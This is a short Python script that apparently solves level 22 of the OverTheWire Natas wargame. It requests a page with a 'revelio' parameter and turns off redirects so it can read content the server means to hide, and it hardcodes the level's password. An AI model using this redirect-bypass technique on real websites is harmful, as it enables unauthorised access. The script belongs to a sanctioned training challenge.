import requests
from requests.auth import HTTPBasicAuth

url = "http://natas22.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas22", "964laB0r7TuDqJj5b3HFtwsQoc0GhjBF")

# create a session object to maintain cookies and authentication between requests
session = requests.Session()
session.auth = auth

response = session.get(url, auth=auth, params={"revelio": "1"}, allow_redirects=False)
print(response.text)